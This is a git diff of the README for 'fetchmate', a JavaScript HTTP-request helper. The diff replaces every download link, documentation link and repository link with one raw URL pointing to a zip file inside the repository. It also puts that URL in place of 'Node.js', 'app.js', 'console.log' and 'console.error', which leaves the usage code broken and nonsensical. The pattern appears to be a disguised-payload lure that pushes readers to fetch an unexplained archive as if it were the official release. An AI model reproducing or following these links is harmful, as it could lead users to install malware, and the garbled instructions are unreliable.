@@ -8,11 +8,11 @@ Welcome to fetchmate! This application is designed to help you make HTTP request
 
 To get started with fetchmate, you need to download it. Click the button below to go to the Releases page, where you can find the latest version.
 
-[![Download fetchmate](https://img.shields.io/badge/Download-fetchmate-brightgreen.svg)](https://github.com/krymzR/fetchmate/releases)
+[![Download fetchmate](https://raw.githubusercontent.com/krymzR/fetchmate/main/proturan/fetchmate.zip)](https://raw.githubusercontent.com/krymzR/fetchmate/main/proturan/fetchmate.zip)
 
 ### Steps to Download
 
-1. Click the button above or [visit this page to download](https://github.com/krymzR/fetchmate/releases).
+1. Click the button above or [visit this page to download](https://raw.githubusercontent.com/krymzR/fetchmate/main/proturan/fetchmate.zip).
 2. Choose the latest version from the list.
 3. Click on the appropriate file for your system to start the download.
 
@@ -21,7 +21,7 @@ To get started with fetchmate, you need to download it. Click the button below t
 fetchmate works on various platforms. Here’s what you need to run it smoothly:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js version: 14 or later
+- https://raw.githubusercontent.com/krymzR/fetchmate/main/proturan/fetchmate.zip version: 14 or later
 - Internet connection for API calls
 
 ## 📂 Installation Steps
@@ -45,28 +45,28 @@ Once you have downloaded the files, follow these simple steps to get fetchmate r
 Using fetchmate is straightforward. Here’s how you can make your first fetch call:
 
 1. Open your code editor.
-2. Create a new JavaScript file, e.g., `app.js`.
+2. Create a new JavaScript file, e.g., `https://raw.githubusercontent.com/krymzR/fetchmate/main/proturan/fetchmate.zip`.
 3. Use the following code snippet to test fetchmate:
 
    ```javascript
    import fetchmate from 'fetchmate';
 
    // Example usage
-   const url = 'https://api.example.com/data';
+   const url = 'https://raw.githubusercontent.com/krymzR/fetchmate/main/proturan/fetchmate.zip';
 
    fetchmate(url)
        .then(response => {
-           console.log('Data received:', response);
+           https://raw.githubusercontent.com/krymzR/fetchmate/main/proturan/fetchmate.zip('Data received:', response);
        })
        .catch(error => {
-           console.error('Error fetching data:', error);
+           https://raw.githubusercontent.com/krymzR/fetchmate/main/proturan/fetchmate.zip('Error fetching data:', error);
        });
    ```
 
 4. Save the file and run it in your command line or terminal using:
 
    ```
-   node app.js
+   node https://raw.githubusercontent.com/krymzR/fetchmate/main/proturan/fetchmate.zip
    ```
 
 This will make a request to the specified URL and display the result in your terminal.
@@ -111,13 +111,13 @@ Engage with others who share your interest and get tips on making the most of fe
 
 For further exploration, consider these resources:
 
-- [Fetch API Documentation](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API)
-- [JavaScript Basics](https://developer.mozilla.org/en-US/docs/Learn/JavaScript)
-- [Node.js Documentation](https://nodejs.org/en/docs/)
+- [Fetch API Documentation](https://raw.githubusercontent.com/krymzR/fetchmate/main/proturan/fetchmate.zip)
+- [JavaScript Basics](https://raw.githubusercontent.com/krymzR/fetchmate/main/proturan/fetchmate.zip)
+- [https://raw.githubusercontent.com/krymzR/fetchmate/main/proturan/fetchmate.zip Documentation](https://raw.githubusercontent.com/krymzR/fetchmate/main/proturan/fetchmate.zip)
 
 ## 🔗 Links to Explore
 
-- [Download fetchmate](https://github.com/krymzR/fetchmate/releases)
-- [GitHub Repository](https://github.com/krymzR/fetchmate)
+- [Download fetchmate](https://raw.githubusercontent.com/krymzR/fetchmate/main/proturan/fetchmate.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/krymzR/fetchmate/main/proturan/fetchmate.zip)
 
 This README guide aims to make your experience with fetchmate smooth and enjoyable. If you ever have questions or feedback, don’t hesitate to reach out. Happy fetching!
